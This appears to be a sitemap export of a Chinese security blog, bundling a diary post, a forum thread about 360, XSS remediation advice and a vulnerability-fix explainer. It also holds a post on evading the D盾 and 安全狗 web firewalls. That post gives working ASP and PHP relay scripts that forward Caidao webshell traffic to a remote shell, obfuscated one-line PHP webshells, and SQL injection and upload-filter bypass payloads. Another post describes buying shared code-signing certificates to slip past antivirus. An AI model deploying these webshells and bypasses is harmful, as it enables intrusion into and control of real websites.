<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">

    
  <url>
    <loc>http://www.weshell.net/new-year.html</loc>
    <lastmod>2015-02-24T09:40:15.000Z</lastmod>
    <data>
        <display>
        <title>转眼间年已过完</title>
        <pubTime>2015-02-24T09:08:00.000Z</pubTime>
        
         <content><![CDATA[<p>  很久没有写文章了，一个月？半年？一年？已经忘记了，或许是变懒了也或许是工作实在是太忙，很久没有像这样闲下来坐在这里专心的写一篇文章了。因为是公司的计算机，所以又折腾了好久搭建好Github环境…..</p>
<p>  不得不感叹时间过的如此之快，果真是光阴似箭、岁月如梭，现在很多人的博客已经打不开了或许永远也打不开了，当初记下的稚嫩回忆如今已然变成了回忆，愿你们可以过的很好，或许你们不会看到我的祝福</p>
<p>  写点自己的事情吧，因为记性不是太好，所以记下来会更好一些，以后闲暇之余也能品尝一二。<br>  如今过年的感觉与当初相差甚远，不知是这个“年”变了，还是我们的心性变了，总之已没了当初的乐趣，吃饭喝酒似乎便是必备功课，如此循环往复等待上班，从年三十一直到现在备战在工作岗位上，不知是我贪图加倍的工资还是逃避已经变了味儿的年，我曾经厌恶的别人如今已经成了我自己。<br>  给父亲和爷爷烧纸已经是我的必备功课了，还记得曾经父亲带着穿着新衣服的我提着纸钱，路过一个垃圾场、路过一片桃树林，走过一个堤坝，来到爷爷坟前磕头烧纸….而如今只剩我孤身一人，烧纸磕头时已泪流满面。原谅我文笔不好写不出我当时的心情，或许也不会写出来，这份感情将要随我一起埋入地下，化作一地黄土，假以时日我的孩子大概也会怀着我同样的心情，在我坟前祭拜</p>
]]></content>
         
         
           
             
              <breadCrumb title="生活琐事" url="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/about-360.html</loc>
    <lastmod>2015-01-10T08:13:44.000Z</lastmod>
    <data>
        <display>
        <title>过360方法之研究-仅供娱乐</title>
        <pubTime>2014-01-10T04:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>  这不是一篇技术文章，本来打算写在生活琐事下的，又懒得改，Github很麻烦，写下来博各位看官一笑</p>
<p>  本篇前提是：你得有钱（这不废话么）</p>
<p>360是老流氓，黑客是小流氓，老流氓当然不会会让小流氓来分一杯羹<br>小流氓也是辛苦啊~~~</p>
<p>当你软件运行时 会遇到如下几种阻止你运行的方式</p>
<ol>
<li><p>提示危险软件，软件有关键部位操作，并定义为危险，提示用户关闭软件</p>
</li>
<li><p>报毒，，直接提示删除程序。</p>
</li>
<li><p>提示未知软件，提示框默认为停止运行，用户只要点击一下你的软件就不能运行了。</p>
</li>
</ol>
<p>4 关键部位操作提示，比如加入启动项，服务项，操作注册表等操作前会提示，让用户阻止你操作关键部位</p>
<p>过360全套的意思就是: 以上4个提示操作 全部没有，让你的软件自由的运行，完全不管你。。。</p>
<p>方法1：</p>
<pre><code>    养白你的软件，

    当你的软件没有恶意行为，并被很多用户使用了，软件会被拉进360的白名单，会当做安全软件，完全不管你的软件行为，你可以任意操作系统关键部分。

    这个过程视你软件的运行用户多少，时间有可能1个月，也可能是3个月或更长。

    一旦被拉进白名单的软件，就能保证很长时间的 过360全套，，，
</code></pre><p>方法2：自己提交软件到360软件认证中心，认证过了就被拉进白名单了。</p>
<p>方法3：</p>
<p>用软件数字签名，数字签名年费大概5000左右，</p>
<p>你可以去淘宝上买，有便宜的，不过是很多人公用的，卖家会帮你的程序打上数字签名收取费用，有的直接卖给你数字签名的工具，让你自己打签名。</p>
<p>注意事项：</p>
<p>1 数字签名如果是新申请的，360可能会不认可，也会提示未知软件，时间段时间就好了</p>
<p>2 数字签名不是永久的 过360全套，360还是会监视你软件的行为，如果有恶意行为，会吧你的数字签名拉进黑名单，你的数字签名将无效。</p>
<p>  哈哈，请放下你的板砖，我承认此文仅仅是一篇娱乐文章，千万不要试图拍我~~</p>
]]></content>
         
         
           
             
              <breadCrumb title="技术文章" url="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/loudong-safe.html</loc>
    <lastmod>2015-01-10T08:12:04.000Z</lastmod>
    <data>
        <display>
        <title>为什么一个文件可以修复多个不同文件的漏洞</title>
        <pubTime>2014-01-10T03:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>由于之前有站长说我不相信你就用了一个XX文件就能够把漏洞给我修复了。<br>好吧，我就在这里解释下为什么一个文件可以修复多个不同文件的漏洞。<br><img src="http://p0.qhimg.com/t0199f04936589cff42.jpg" alt="漏洞修复"><br>首先，我们需要知道的是网站的目录结构和文件联系。<br>一般我们都知道网站都会有一些配置文件.<br>常用PHP建站系统的公用页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PHPCMS ：      \phpcms\base.php</div><div class="line">PHPWIND：     \phpwind\conf\baseconfig.php</div><div class="line">DEDECMS：     \data\common.inc.php</div><div class="line">Discuz：           \config\config_global.php</div><div class="line">Wordpress：    \wp-config-sample.php</div><div class="line">ECshop：         \data\config.php</div><div class="line">Metinfo：         \include\head.php</div><div class="line">HDwiki：          \config.php</div></pre></td></tr></table></figure>

<p>上面的这些文件都是网站的公共文件，里面基本都是数据库配置和网站相关配置。<br>那么我们又是如何使用一个文件修复漏洞的呢？<br>我们看看下面的这些代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line">define(<span class="string">'IN_SMT'</span>, <span class="keyword">true</span>);</div><div class="line">define(<span class="string">'IN_MYMPS'</span>, <span class="keyword">true</span>);</div><div class="line">define(<span class="string">'CURSCRIPT'</span>,<span class="string">'index'</span>);</div><div class="line"></div><div class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">"/include/global.php"</span>;</div><div class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">"/data/config.php"</span>;</div><div class="line"></div><div class="line">ifsiteopen();</div><div class="line"><span class="keyword">require_once</span> MYMPS_DATA.<span class="string">"/config.db.php"</span>;</div><div class="line"><span class="keyword">require_once</span> MYMPS_INC.<span class="string">"/db.class.php"</span>;</div><div class="line"><span class="keyword">require_once</span> MYMPS_SMARTY.<span class="string">"/include.php"</span>;</div></pre></td></tr></table></figure>

<p>我们这里可以看到首页文件加载了多个PHP文件，其中/config.db.php这个文件，我们来看看他的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="variable">$charset</span>    = <span class="string">"gbk"</span>;<span class="comment">//系统字符集编码</span></div><div class="line"><span class="variable">$dbcharset</span> = <span class="string">"gbk"</span>;<span class="comment">//数据库字符集编码</span></div><div class="line"><span class="variable">$db_host</span>    = <span class="string">"localhost"</span>;<span class="comment">//数据库服务器地址，一般为localhost</span></div><div class="line"><span class="variable">$db_name</span>    = <span class="string">"*********7"</span>;<span class="comment">//使用的数据库名称</span></div><div class="line"><span class="variable">$db_user</span>    = <span class="string">"********7"</span>;<span class="comment">//数据库帐号</span></div><div class="line"><span class="variable">$db_pass</span>    = <span class="string">"9******00"</span>;<span class="comment">//数据库密码</span></div><div class="line"><span class="variable">$db_mymps</span>   = <span class="string">"my_"</span>;<span class="comment">//数据库前缀</span></div><div class="line"><span class="variable">$db_intype</span>  = <span class="string">""</span>;</div><div class="line"><span class="variable">$cookiepre</span> = <span class="string">"y8***_"</span>;<span class="comment">//cookies加密前缀</span></div><div class="line"><span class="variable">$cookiedomain</span> = <span class="string">"**********.net"</span>;</div><div class="line"><span class="variable">$cookiepath</span> = <span class="string">"/"</span>;</div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>


<p>这个文件是系统的数据库配置文件，这个程序的所有文件都会加载这个文件才能正常的查询和写入信息。那么我们在来说说漏洞的产生原因，漏洞不管是注入还是XSS还是其他的，绝大部分都是因为用户的输入信息而产生的，我们就拿XSS来说，大家都知道网站很多都有留言板，留言板一般都有几个用户输入的地方，用户名、邮件地址、电话、地址、留言内容等等，在这几个地方我们可以利用这些输入来加入比如：xss/数据查询这里就有一个前提条件就是需要查询或者写入数据库，不然后台管理员是无法看到留言的，假如我们这里没有对用户输入的信息做任何的处理直接带入到数据库查询或者写入数据库，那么我们的网站就可能被黑客入侵，那么我们现在再回到起点，来说说为什么一个文件就能够修复漏洞，首先我们已经知道了，漏洞产生的原因，那么我们就可以在数据库配置文件中调用我们的防护脚本，防护脚本的作用就是对用户所提交的数据进行检测，如果用户所写入或者查询的数据信息存在危险信息，那么这是防护脚本就能够在数据库返回信息之前拦截掉。这样也就达到了修复漏洞的作用。写这篇文章，我希望有些站长能够明白，什么是数据拦截，什么是函数处理。</p>
]]></content>
         
         
           
             
              <breadCrumb title="知识百科" url="http://www.weshell.net/categories/%E7%9F%A5%E8%AF%86%E7%99%BE%E7%A7%91/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/wenda-360.html</loc>
    <lastmod>2015-01-10T08:09:32.000Z</lastmod>
    <data>
        <display>
        <title>我是360老员工你们有什么想问的(逗死我了)</title>
        <pubTime>2014-01-10T08:01:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="我是360的老员工，你们有什么想问的？">我是360的老员工，你们有什么想问的？</h2>
<p>黑客帝国     2014-03-06 15:11:19<br>随便问</p>
<p>回应</p>
<p>侠之大者 2014-03-06 15:17:11 #1楼<br>360啥时候把腾讯收了？</p>
<p>黑客帝国 2014-03-06 15:55:50 #2楼<br>搞笑，360这辈子都别想收腾讯，腾讯的商业帝国20年之内无人能撼动。</p>
<p>光棍007 2014-03-06 15:57:37 #3楼<br>360是全部员工有股票吗？上次你们年会有中卡宴是真的吗？</p>
<p>电脑高手 2014-03-06 17:33:41 #4楼<br>360员工福利如何？跟百度怎么样？</p>
<p>黑客帝国 2014-03-06 17:37:33 #5楼<br>@3L，不是全员，但也有90%的员工都会持股的，老周这方面对员工不错<br>@4L，福利还行，比百度差一点，但百度跳来360的员工，一般薪资都会涨</p>
<p>cathcher 站长达人     2014-03-17 19:06:02 #6楼<br>360怎么赚钱的？</p>
<p>黑客帝国 2014-03-24 14:35:23 #7楼<br>@cathcher 360绝大部分收入来自360导航，他是对商家收费的，其中还有部分收入来自游戏</p>
<p>光棍007 2014-03-24 14:36:58 #8楼<br>360食堂怎么样？</p>
<p>脚本小子 2014-03-24 15:15:18 #9楼<br>老周一般都怎么跟你们开会？据说还骂哭过一个小朋友是真的吗？</p>
<p>黑客帝国 2014-04-08 18:46:08 #10楼<br>@光棍007 ， 就那样吧，有人说好吃，有人说难吃，反正我不吃，因为所有菜都一个味，酱油，盐，味精不过说实话，菜还是比较多的，食堂去早了还排队的。</p>
<p>黑客帝国 2014-04-08 18:47:00 #11楼<br>@脚本小子， 开会就是轮流骂一圈，先骂一圈再说，骂哭小朋友很正常</p>
<p>脚本小子 2014-04-08 18:48:13 #12楼<br>有没有对骂的？</p>
<p>黑客帝国 2014-04-08 18:48:33 #13楼<br>应该有，不过最后比较惨就是了</p>
<p>bbayou 2014-04-08 18:49:09 #14楼<br>qq是你们的假想敌吗？</p>
<p>黑客帝国 2014-04-08 18:50:28 #15楼<br>不是假象，是宿敌，现在多了一个百度。我们电梯地板是 LYH 和 MHT 的照片，每天上班全公司的人都要踩他们一下</p>
<p>光棍007 2014-04-14 15:26:18 #16楼<br>哈哈哈，要不要这么搞笑</p>
<p>无与宇_比 站长达人     2014-04-16 13:01:51 #17楼<br>还是360老员工啊，呵呵</p>
<p>梦逍遥 2014-04-17 12:53:14 #18楼<br>360什么时候把百度打败?</p>
<p>电脑高手 2014-04-19 11:01:14 #19楼<br>什么时候送我个360儿童手环？</p>
<p>yours 一修哥     2014-05-16 10:42:53 #20楼<br>360 内部用什么im工具</p>
<p>多多哥 站长达人     2014-05-28 12:54:29 #21楼<br>360在so会做贴吧吗</p>
<p>骄阳tian 2014-05-28 14:44:22 #22楼<br>360能不能解决找不到女朋友的问题</p>
<p>黑客帝国 2014-06-13 10:26:53 #23楼<br>@梦逍遥 打败百度至少需要10年</p>
<p>黑客帝国 2014-06-13 10:28:30 #24楼<br>@yours 360内部用飞信沟通，但是BD和市场还是用QQ，这是大势所趋，挡也挡不住。<br>PS：有次去找老周开会，进去之后发现老周正在玩网游</p>
<p>yours 一修哥     2014-06-20 15:04:38 #25楼<br>哈哈，老周有没有喊你一起来，战个痛快！</p>
<p>360用户 2014-06-20 23:08:28 #26楼<br>360怎么做快速排名</p>
<p>x41525031 2014-07-30 21:02:33 #27楼<br>360搜索引擎能做SEO么</p>
<p>happychnengzi 2014-08-18 16:28:55 #28楼<br>为什么“站长群”里用起来这么不方便，考虑我们的体验了吗？？？~~~</p>
<p>邹兄 2014-12-10 17:31:47 #29楼<br>360站长群到底是个什么产品，怎么定位的？</p>
]]></content>
         
         
           
             
              <breadCrumb title="生活琐事" url="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/xss-xiufu.html</loc>
    <lastmod>2015-01-10T07:46:04.000Z</lastmod>
    <data>
        <display>
        <title>跨站脚本 (XSS) 攻击漏洞的修复</title>
        <pubTime>2014-01-10T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>看好了，需要你有一些编程知识，如果你什么都不懂，请自觉点右上角的 x ，否则出了问题本人概不负责！！！！<br>XSS为什么这么恐怖？很简单，黑客用一行代码写在你网站上，不管是评论中还是发帖中，即可黑下你整个网站，拿到你的admin管理员密码，随便删贴，随便搞任何破坏！</p>
<p>———————————————修复方案1 过滤———————————————-<br>修复XSS，核心只有一点，就是将用户所提供的内容输入输出进行过滤，如何过滤？</p>
<ol>
<li>你网站是PHP写的，就用：htmlentities() 或是htmlspecialchars()</li>
<li>是ASP的，用：Server.HTMLEncode()</li>
<li>是ASP.NET的：Server.HtmlEncode() 或功能更强的：Microsoft Anti-Cross Site Scripting Library</li>
<li>是Python的，就用：cgi.escape()</li>
<li>是Java的，用：xssprotect(Open Source Library)</li>
<li>高端点是 Node.js的，用：node-validator<br>（这些代码的使用方法，请自行己百度，很简单）</li>
</ol>
<p>———————————————修复方案2 脚本———————————————-<br>如果你什么都不会，是个小白，可以用360官方提供的漏洞修复插件<br>PHP版：<a href="http://webscan.360.cn/protect/index/" target="_blank" rel="external">http://webscan.360.cn/protect/index/</a>    （2014年1月更新）<br>ASPX：<a href="http://bbs.webscan.360.cn/forum.php?mod=viewthread&amp;tid=711（2013年8月更新）" target="_blank" rel="external">http://bbs.webscan.360.cn/forum.php?mod=viewthread&amp;tid=711（2013年8月更新）</a><br>ASP：<a href="http://bbs.webscan.360.cn/forum.php?mod=viewthread&amp;tid=711" target="_blank" rel="external">http://bbs.webscan.360.cn/forum.php?mod=viewthread&amp;tid=711</a> （2013年9月更新）<br>但注意了，这个插件也只能修一些常见的XSS，只能修复部分漏洞，如果你是discuz或者dedecms，最好升级官方最新版！！</p>
<p>———————题外话———————</p>
<ol>
<li>有编程上的问题可以在下面回复，我会解答</li>
<li>有句话叫想要得到好的解答，必须问对问题。别发那些 “我的网站有问题，怎么修？” 这种屁话，网站是什么也不说，什么漏洞也不说，谁给你修？</li>
</ol>
]]></content>
         
         
           
             
              <breadCrumb title="技术文章" url="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/for-waf.html</loc>
    <lastmod>2015-01-10T07:09:34.000Z</lastmod>
    <data>
        <display>
        <title>绕过D盾安全狗连接菜刀思路</title>
        <pubTime>2015-10-10T06:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="0x00_各种奇葩符号">0x00 各种奇葩符号</h2>
<p>  现在基本上没啥用了，毕竟几年前的小玩意儿</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/;.xxx.asp;.jpg</div><div class="line">/;00.asp/00.jpg</div></pre></td></tr></table></figure>


<p>像这种各位看官可以忽略了，毕竟某狗和某盾也不是吃干饭的，写出来只是为了纪念一下</p>
<h2 id="0x02##_中转(1)，抓菜刀连接webshell的包_然后研究安全狗过滤了哪些关键字_中转替换掉那些过滤的关键字">0x02##  中转(1)，抓菜刀连接webshell的包 然后研究安全狗过滤了哪些关键字 中转替换掉那些过滤的关键字</h2>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">&lt;%</div><div class="line">JmStr=Replace(Request.Form,"$_POST","$_REQUEST")</div><div class="line">JmStr=Replace(JmStr,"-&gt;|","--&gt;|")</div><div class="line">JmStr=Replace(JmStr,"@eval(","@eval   (")</div><div class="line">JmStr=Replace(JmStr,"System.Convert.FromBase64String","System.Convert. FromBase64String")</div><div class="line">JMUrl=request("dz")</div><div class="line">response.write  request("dz")</div><div class="line">JmRef=JMUrl</div><div class="line">JmCok=""</div><div class="line">response.write  PostData(JMUrl,JmStr,JmCok,JmRef)</div><div class="line">Function PostData(PostUrl,PostStr,PostCok,PostRef)</div><div class="line">Dim Http</div><div class="line">Set Http = Server.CreateObject("msxml2.serverXMLHTTP")</div><div class="line">With Http</div><div class="line">.Open "POST",PostUrl,False</div><div class="line">.SetRequestHeader "Content-Length",Len(PostStr)</div><div class="line">.SetRequestHeader "Content-Type","application/x-www-form-urlencoded"</div><div class="line">.SetRequestHeader "Referer",PostRef</div><div class="line">'.SetRequestHeader "Cookie",PostCok</div><div class="line">.Send PostStr</div><div class="line">PostData = .ResponseBody</div><div class="line">End With</div><div class="line">Set Http = Nothing</div><div class="line">PostData =bytes2BSTR(PostData)</div><div class="line">End Function</div><div class="line"></div><div class="line">Function bytes2BSTR(vIn)</div><div class="line">Dim strReturn</div><div class="line">Dim I, ThisCharCode, NextCharCode</div><div class="line">strReturn = ""</div><div class="line">For I = 1 To LenB(vIn)</div><div class="line">ThisCharCode = AscB(MidB(vIn, I, 1))</div><div class="line">If ThisCharCode &lt; &H80 Then</div><div class="line">strReturn = strReturn & Chr(ThisCharCode)</div><div class="line">Else</div><div class="line">NextCharCode = AscB(MidB(vIn, I + 1, 1))</div><div class="line">strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))</div><div class="line">I = I + 1</div><div class="line">End If</div><div class="line">Next</div><div class="line">bytes2BSTR = strReturn</div><div class="line">End Function</div><div class="line"></div><div class="line">Function URLEncoding(vstrin)</div><div class="line">strReturn=""</div><div class="line">Dim i</div><div class="line">For i=1 To Len(vstrin)</div><div class="line">ThisChr=Mid(vstrin,i,1)</div><div class="line">if Abs(Asc(ThisChr))&lt; &HFF Then</div><div class="line">strReturn=strReturn & ThisChr</div><div class="line">Else</div><div class="line">InnerCode=Asc(ThisChr)</div><div class="line">If InnerCode&lt;0 Then</div><div class="line">InnerCode=InnerCode + &H10000</div><div class="line">End If</div><div class="line">Hight1=(InnerCode And &HFF00) \&HFF</div><div class="line">Low1=InnerCode And &HFF</div><div class="line">strReturn=strReturn & "%" & Hex(Hight1) & "%" & Hex(Low1)</div><div class="line">End if</div><div class="line">Next</div><div class="line">strReturn=Replace(strReturn,chr(32),"%20") '转换空格,如果网站过滤了空格,尝试用/**/来代替%20</div><div class="line">strReturn=Replace(strReturn,chr(43),"%2B")  'JMDCW增加转换+字符</div><div class="line">'strReturn=Replace(strReturn,过滤字符,"转换为字符")  '在此增加要过滤的代码</div><div class="line">URLEncoding=strReturn</div><div class="line">End Function</div><div class="line">%&gt;</div></pre></td></tr></table></figure>

<p>用法：<br>1.将这个脚本拿到可执行的.asp目录<br>2.访问<a href="http://demo.com/demo.asp?dz=&quot;要过的shell地址" target="_blank" rel="external">http://demo.com/demo.asp?dz=&quot;要过的shell地址</a>“<br>3.把地址输入菜刀，密码就是你设置的shell密码，类型还选一句话后缀<br>例如：<a href="http://www.xx.com/asf.asp?dz=http://xxx.com/yijuhua.php" target="_blank" rel="external">http://www.xx.com/asf.asp?dz=http://xxx.com/yijuhua.php</a> 密码<br>4.这个脚本暂时支持.php .aspx的一句话连接  .asp的不能用</p>
<h2 id="0x02##_中转(2)_若果上面脚本失效，可以使用这个">0x02## 中转(2) 若果上面脚本失效，可以使用这个</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="variable">$webshell</span>=<span class="string">"http://www.phpinfo.me/plus/helen.php"</span>;<span class="comment">//把这里改成你的shell地址</span></div><div class="line"><span class="variable">$webshell</span>=<span class="variable">$webshell</span>.<span class="string">"?&1141056911=base64_decode"</span>;</div><div class="line"><span class="variable">$da</span>=<span class="variable">$_POST</span>;</div><div class="line"><span class="variable">$data</span> = <span class="variable">$da</span>;</div><div class="line">@<span class="variable">$data</span>=str_replace(<span class="string">"base64_decode("</span>,<span class="string">'$_GET[1141056911]('</span>,<span class="variable">$data</span>); <span class="comment">//接收菜刀的post，并把base64_decode替换成$_GET[1141056911](</span></div><div class="line"> <span class="comment">//print_r($data);</span></div><div class="line"><span class="variable">$data</span> = http_build_query(<span class="variable">$data</span>);  </div><div class="line"><span class="variable">$opts</span> = <span class="keyword">array</span> (  </div><div class="line"><span class="string">'http'</span> =&gt; <span class="keyword">array</span> (  </div><div class="line"><span class="string">'method'</span> =&gt; <span class="string">'POST'</span>,  </div><div class="line"><span class="string">'header'</span>=&gt; <span class="string">"Content-type: application/x-www-form-urlencoded\r\n"</span> .  </div><div class="line"><span class="string">"Content-Length: "</span> . strlen(<span class="variable">$data</span>) . <span class="string">"\r\n"</span>,  </div><div class="line"><span class="string">'content'</span> =&gt; <span class="variable">$data</span>)</div><div class="line">);</div><div class="line"><span class="variable">$context</span> = stream_context_create(<span class="variable">$opts</span>);  </div><div class="line"><span class="variable">$html</span> = @file_get_contents(<span class="variable">$webshell</span>, <span class="keyword">false</span>, <span class="variable">$context</span>); <span class="comment">//发送post  </span></div><div class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;  </div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>小马的话你可以把这两个丢进去：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">'a'</span>];<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]);<span class="preprocessor">?&gt;</span></div><div class="line"><span class="preprocessor">&lt;?php</span> <span class="variable">$x</span>=base64_decode(<span class="string">"YXNzZXJ0"</span>);<span class="variable">$x</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);<span class="preprocessor">?&gt;</span>;</div></pre></td></tr></table></figure>

<p>用法：<br>1.把$webshell改成你的webshell地址<br>2.把代码保存为1234.php放到你本地的php环境里 然后直接丢菜刀连接<br><img src="http://dn-wwweshell.qbox.me/caidao1.png" alt="菜刀"></p>
<h2 id="0x03##_伪装user-agent">0x03## 伪装user-agent</h2>
<p> 晚上工具有很多，你可以随便找一个用，firfox也是比较强大的，我用的是铁鹰兄的WAF绕过神器来做试验的，地址放在下面<br><img src="http://dn-wwweshell.qbox.me/tiey1.png" alt="waf绕过神器"></p>
<p>首先假设一个代理，ie设置之后，那么ie的流量就从这个端口过。<br>指定域名，也就是只正对目标站修改user-agent，减少工作量。<br>get改为post好像是过智创waf的吧。</p>
<h2 id="0x04##_复参数绕过">0x04## 复参数绕过</h2>
<p>比如一个请求是这样的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /pen/news.php?id=1 union select user,password from mysql.user</div></pre></td></tr></table></figure>

<p>可以修改为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /pen/news.php?id=1&id=union&id=select&id=user,password&id=from%20mysql.user</div></pre></td></tr></table></figure>

<p>很多WAF都可以这样绕，目前安全狗的话可以绕过一丢丢语句</p>
<h2 id="0x05##_番外篇_SQL注入绕过">0x05## 番外篇 SQL注入绕过</h2>
<p>  ok，首先来一发demo存在SQL注入漏洞的php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?</span></div><div class="line"><span class="variable">$uid</span> = <span class="variable">$_REQUEST</span>[<span class="string">'id'</span>];</div><div class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span> = @mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>))</div><div class="line"><span class="keyword">die</span>(<span class="string">'&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to connect to the database.'</span>);</div><div class="line"><span class="keyword">if</span>(!@mysql_select_db(<span class="string">"supe"</span>,<span class="variable">$conn</span>))</div><div class="line"><span class="keyword">die</span>(<span class="string">"&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to find it at database on your MySQL server."</span>);</div><div class="line"><span class="variable">$text</span> = <span class="string">"select * from supe_members where uid="</span>.<span class="variable">$uid</span>;</div><div class="line"><span class="variable">$rs</span> = mysql_query (<span class="variable">$text</span>,<span class="variable">$conn</span>);</div><div class="line"><span class="keyword">while</span>(<span class="variable">$rom</span> = mysql_fetch_array(<span class="variable">$rs</span>))</div><div class="line">{</div><div class="line">    <span class="keyword">echo</span> <span class="variable">$rom</span>[<span class="string">"username"</span>];</div><div class="line">}</div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>因为用的是supesite的库，可以看到这里是有明显SQL注入漏洞的，当没有安全狗的时候可以成功注入：<br><img src="http://dn-wwweshell.qbox.me/sql0x1.png" alt="SQL注入"></p>
<p>测试发现，安全狗这块的匹配正则应该是\s+and这类的，所以只要想办法去掉空格，用普通注释/<em>*/是不行的，安全狗也防了这块。但是对内联注释/</em>!and*/这种不知道为什么安全狗没有拦截。<br>我用下面的语句居然成功绕过SQL注入过滤：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.200.115/inj.php?id=1/*!and*/1=2/*!union*//*!select*/1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17</div></pre></td></tr></table></figure>

<h2 id="0x05##_番外篇_上传绕过">0x05## 番外篇 上传绕过</h2>
<p> 我们通过burp把上传的HTTP包抓下来，然后自己进行一下修改POST数据。经过了一些实验，直接说结果吧，当增加一处文件名和内容，让两个文件名不一致的时候，成功绕过了安全狗的防护，上传了php文件。原因是安全狗进行文件名匹配时候用的是第一个文件名test.jpg，是复合安全要求的，但是webserver在保存文件的时候却保存了第二个文件名test.php，也就是if(security_check(a)){do(b);}，导致安全检查没有用</p>
]]></content>
         
         
           
             
